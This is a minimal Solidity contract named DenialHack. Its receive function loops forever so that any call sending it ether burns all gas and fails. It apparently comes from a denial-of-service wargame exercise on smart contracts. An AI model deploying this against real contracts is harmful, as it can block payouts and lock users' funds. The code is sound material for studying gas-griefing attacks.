// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract DenialHack {

    uint count;

    receive() external payable {
        
        while (true) {
            count++;
        }
    }

}